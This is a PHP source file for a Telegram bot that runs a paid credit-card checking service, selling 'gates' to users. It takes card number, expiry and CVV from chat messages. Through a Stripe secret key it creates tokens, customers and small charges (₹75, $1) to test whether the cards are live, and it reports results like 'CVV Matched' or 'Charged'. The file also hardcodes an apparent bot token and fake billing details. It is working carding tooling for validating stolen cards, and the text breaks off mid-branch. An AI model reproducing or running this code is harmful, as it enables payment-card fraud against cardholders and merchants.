<?php

////////////////=============[Gunnu Bot Raw]=============////////////////
////////==========J]==========////////

$botToken = "5503627229:AAEBgbz2y9kh3YUmeJcmTyfdDFOFSnQE1y0"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$lastname = $update["message"]["from"]["last_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$premiums = file_get_contents('users.txt');
$premium = explode("\n", $premiums);
$group = file_get_contents('groups.txt');
$groups = explode("\n", $group);
if($userId == '5126378056') {
$usernam = ''.$username.'%0A [OWNER]';
}
elseif($userId == '5126378056') {
$usernam = ''.$username.'%0A [CO-OWNER]';
}
elseif (in_array($userId, $premium)) {
$usernam = ''.$username.'%0A [PREMIUM]';
}
else{
    $usernam = ''.$username.'%0A [FREE]';
}
function random_strings($length_of_string) 
{
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
                       0, $length_of_string); 
}
$mail = 'gunnumittal'.random_strings(6).'';

//////////=========[Start Command]=========//////////


if ((strpos($message, "/gunnu") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>⋆Heya :') %0A⋆I see that you're intrested %0A⋆In my commands%0A⋆Use /cmds to view them.%0A⋆Bot by --»[GUNNU]⛈%0A@EuxxxuE</b>", $message_id);
}
elseif ((strpos($message, "!auth") === 0)||(strpos($message, "/auth") === 0)){
if($userId == '5126378056') {
$addpremium = substr($message, 6);
fwrite(fopen('users.txt', 'a'), $addpremium."\r\n");
sendMessage($chatId, "<b>Successfully added $addpremium to premium user</b>", $message_id);
}

else {
sendMessage($chatId, "<b>⋆You Can't  Add Users Ask %0A⋆[GUNNU]⛈ To Add You  </b>", $message_id);
}
}

elseif ((strpos($message, "!group") === 0)||(strpos($message, "/group") === 0)){
if($userId == '5126378056') {
$addgroup = substr($message, 7);
fwrite(fopen('groups.txt', 'a'), $addgroup."\r\n");
sendMessage($chatId, "<b>Successfully added $addgroup to Authorised Groups</b>", $message_id);
}

else {
sendMessage($chatId, "<b>⋆You Can't  Add Groups, Ask %0A⋆[GUNNU]⛈ To Add Your Group</b>", $message_id);
}
}


//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<b>-> Commands%0A--------------------------------------------%0A/free - View Free Gates%0A--------------------------------------------%0A/paid - View Premium Gates%0A--------------------------------------------%0A/tools - View Bot Tools%0A--------------------------------------------%0A/plans - View Prices%0A--------------------------------------------%0A%0ABot by --»[GUNNU]⛈%0A@EuxxxuE</b>", $message_id);
}

elseif (strpos($message, "/plans") === 0){
sendMessage($chatId, "<b>-> Prices%0A--------------------------------------------%0A$3 [15 Days]%0A--------------------------------------------%0A$6 [30 Days]%0A--------------------------------------------%0A/paid - Premium Gates%0A--------------------------------------------%0A/free - Free Gates%0A--------------------------------------------%0A%0APayment%0AMethods: <code>Btc, PayPal, Upi</code>%0A%0AContact --»[GUNNU]⛈%0A@EuxxxuE</b>", $message_id);
}

elseif (strpos($message, "/paid") === 0){
sendMessage($chatId, "<b>-> Premium Gates%0A--------------------------------------------%0A/usd - Stripe charge $1%0AStatus: ON✅%0A--------------------------------------------%0A/eur - Stripe charge €1%0AStatus: ON✅%0A--------------------------------------------%0A/gbp - Stripe charge £1%0AStatus: ON✅%0A--------------------------------------------%0A/inr - Stripe charge ₹75%0AStatus: ON✅%0A--------------------------------------------%0A/free - Free Gates%0A--------------------------------------------%0A/tools - View Tools%0A--------------------------------------------%0A/plans - View Prices%0A--------------------------------------------%0A%0AFormat: <code>cc|mm|y|cvv</code>%0A%0A%0ABot by --»[GUNNU]⛈%0A@EuxxxuE</b>", $message_id);
}

elseif (strpos($message, "/free") === 0){
sendMessage($chatId, "<b>-> Free Gates%0A--------------------------------------------%0A/bin - Bin Lookup%0AStatus: ON✅%0A--------------------------------------------%0A/ch - Stripe Auth%0AStatus: ON✅%0A--------------------------------------------%0A/chk - Stripe charge $1%0AStatus: ON✅%0A--------------------------------------------%0A/paid - Premium Gates%0A--------------------------------------------%0A/tools - View Tools%0A--------------------------------------------%0A%0AFormat: <code>cc|mm|y|cvv</code>%0A%0A%0ABot by --»[GUNNU]⛈%0A@EuxxxuE</b>", $message_id);
}

elseif (strpos($message, "/tools") === 0){
sendMessage($chatId, "<b>-> Tools%0A--------------------------------------------%0A/bin - Bin Lookup%0AStatus: ON✅%0A--------------------------------------------%0A/id - Your Acc ID%0AStatus: ON✅%0A--------------------------------------------%0A/zee5 - Zee 5 Checker%0AStatus: ON✅%0A--------------------------------------------%0A/paid - Premium Gates%0A--------------------------------------------%0A/free - Free Gates%0A--------------------------------------------%0A%0AContact --»[GUNNU]⛈%0A@EuxxxuE</b>", $message_id);
}
//////////=========[Info/Status Command]=========//////////

elseif ((strpos($message, "/info") === 0)||(strpos($message, "!me") === 0)||(strpos($message, "!id") === 0)||(strpos($message, "!info") === 0)||(strpos($message, "/id") === 0)||(strpos($message, "/me") === 0)||(strpos($message, "/status") === 0)){
sendMessage($chatId, "<b>⋆ID:</b> <code>$userId</code>%0A<b>⋆First Name:</b> $firstname%0A<b></b><b>⋆Username:</b>%0A @$usernam <b>%0A⋆Bot by --»[GUNNU]⛈%0A @EuxxxuE</b>", $message_id);
}



//////////=========[Bin Command]=========//////////

elseif ((strpos($message, "/bin") === 0)||(strpos($message, "!bin") === 0)||(strpos($message, ".bin") === 0)){
$bin = substr($message, 5);
$bin = substr($bin,0,6);
if(empty($bin)){
sendMessage($chatId, '<b>❌ Invalid Bin%0AFormat - /bin xxxxxx</b>', $message_id);
}
else {
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
$phone = GetStr($fim, '"phone":"', '"');
$site = GetStr($fim, '"url":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if (empty($bank)) {
$bank = 'N/A';
}
if (empty($name)) {
$name = 'N/A';
}
if (empty($brand)) {
$brand = 'N/A';
}
if (empty($country)) {
$country = 'N/A';
}
if (empty($emoji)) {
$emoji = 'N/A';
}
if (empty($currency)) {
$currency = 'N/A';
}
if (empty($phone)) {
$phone = 'N/A';
}
if (empty($scheme)) {
$scheme = 'N/A';
}
if (empty($type)) {
$type = 'N/A';
}
if (empty($site)) {
$site = 'N/A';
}
if (empty($phone)) {
$phone = 'N/A';
}
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>⋆Bin:</b> '.$bin.'%0A<b>⋆Bank:</b> '.$bank.'%0A<b>⋆Country:</b> '.$name.''.$emoji.'%0A<b>⋆Brand:</b> '.$brand.'%0A<b>⋆Card:</b> '.$scheme.'%0A<b>⋆Type:</b> '.$type.'%0A<b>⋆Currency:</b> '.$currency.'%0A<b>⋆Phone:</b> '.$phone.'%0A<b>⋆Site:</b> '.$site.'%0A<b>⋆Checked By:</b> @'.$username.'%0A%0A<b> ⋆Bot by --»[GUNNU]⛈%0A @EuxxxuE </b>', $message_id);
}
}



    //////////=========[AUTH$ +++ CHARGE GATE]=========//////////
    
    
    elseif ((strpos($message, "/chk") === 0)||(strpos($message, "!chk") === 0)||(strpos($message, ".chk") === 0)){
        sendMessage($chatId, '<b>❌OFF Use /ch Gate</b>', $message_id);
        }




        //////////=========[AUTH GATE]=========//////////
  
     elseif ((strpos($message, "/ch") === 0)||(strpos($message, "!ch") === 0)||(strpos($message, ".ch") === 0)){
        if (in_array($chatId, $groups)) {
        $lista = substr($message, 4);
        $i = explode("|" , $lista);
        $cc = $i[0];
        $mon = $i[1];
        $year = $i[2];
        $year1 = substr($yyyy, 2, 4);
        $cvv = $i[3];
        $amt = $i[4];
        $sk = 'sk_live_xxxxxxxxxxxxxxxx';
        function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);  
        return $str[0];
        };
        $separa = explode("|",  $lista);
        $cc = $separa[0];
        $mes = $separa[1];
        $ano = $separa[2];
        $cvv = $separa[3];
        $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=GUNNU&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
    $result1 = curl_exec($ch);
  $s = json_decode($result1, true);
  $msg1 = trim(strip_tags(getStr($result1,'"message": "','"')));
$token = $s['id'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Gunnu Auth&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
 $msg2 = trim(strip_tags(getStr($result2,'"message": "','"')));
if(strpos($result2,'"cvc_check": "pass"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» APPROVED</b>%0A<b>Gateway -» Stripe Auth </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Auth</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result1,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Auth </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
         elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe  Auth</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Auth</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Auth </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
       elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Auth</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);
        }
        elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Auth </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Type:</b> $type %0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Auth </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Auth </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card was declined."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Your Card Was Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Auth </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        else {
        sendMessage($chatId, "<b>Try other gates or send correct format%0A<code>cc|mm|yy|cvc</code></b>", $message_id);};}
        
    else{
        sendMessage($chatId, "<b>You/this chat is not Authorised, Join @eslamchk to use Bot for free or Contact @EuxxxuE to get Premium%0A⋆Bot by --»[GUNNU]⛈</b>", $message_id);
        }
        }
    
    //////////=========[75₹CHARGE GATE]=========//////////
    
    
    elseif ((strpos($message, "/inr") === 0)||(strpos($message, "!inr") === 0)||(strpos($message, ".inr") === 0)){
        if (in_array($userId, $premium)) {
        $lista = substr($message, 5);
        $i = explode("|", $lista);
        $cc = $i[0];
        $mon = $i[1];
        $year = $i[2];
        $year1 = substr($yyyy, 2, 4);
        $cvv = $i[3];
        $amt = $i[4];
        $sk = 'sk_live_xxxxxxxxxxxxxxxx';
        function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);  
        return $str[0];
        };
       $separa = explode("|", $lista);
        $cc = $separa[0];
        $mes = $separa[1];
        $ano = $separa[2];
        $cvv = $separa[3];
        $amt = $separa[4];
        if(empty($amt)){
        $amt = '75';
        }
        $amount = $amt * 100;
        $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=Gunnu Mittal');
        $result1 = curl_exec($ch);
        $tok1 = Getstr($result1,'"id": "','"');
        $msg1 = Getstr($result1,'"message": "','"');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=inr&payment_method_types[]=card&description=Gunnu Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
        $result2 = curl_exec($ch);
        $msg2 = Getstr($result2,'"message": "','"');
        $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
        if(strpos($result2, '"seller_message": "Payment complete."' )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Charged ₹$amt ✅</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>Checked By -» @$usernam</b>%0A<b>Bot -» @eslamcheckerbot</b>%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE</b>", $message_id);
 
        }
        elseif(strpos($result2, "insufficient_funds" )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3DS2 REQUIRED</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"cvc_check": "pass"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result1,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge ₹$amt</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);
        }
        elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
